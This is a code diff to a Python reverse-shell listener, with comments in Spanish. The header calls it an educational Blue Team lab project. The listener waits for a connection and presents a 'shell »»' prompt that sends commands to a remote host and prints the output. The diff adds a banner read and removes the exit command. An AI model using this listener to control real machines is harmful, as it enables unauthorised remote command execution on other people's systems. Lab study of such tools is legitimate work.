@@ -4,8 +4,6 @@
 # PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
 # ADVERTENCIA: Solo usar en laboratorio aislado propio
 # =============================================================================
-
-#!/usr/bin/env python3
 import socket
 
 class Listener:
@@ -17,7 +15,13 @@ class Listener:
         print("[+] Esperando Conexiones")
         self.connection, address = listener.accept()
         print("[+] Tenemos una conexion de " + str(address))
-    
+        
+        # ← ✅ AGREGAR ESTO: Recibir el conexion ANTES del loop
+        conexion = self.connection.recv(1024)
+        print(conexion.decode('utf-8', errors='ignore'))
+        #self.connection, address = listener.accept()
+        #print("[+] Tenemos una conexion de " + str(address))
+        
     def ejecutarRemoto(self, command):
         self.connection.send(command.encode('utf-8'))
         return self.connection.recv(1024000)
@@ -25,9 +29,7 @@ class Listener:
     def run(self):
         while True:
             command = input("shell »» ")
-            if command == "salir":
-                self.connection.close()
-                exit()
+
             result = self.ejecutarRemoto(command)
             print(result.decode('utf-8', errors='ignore'))
 
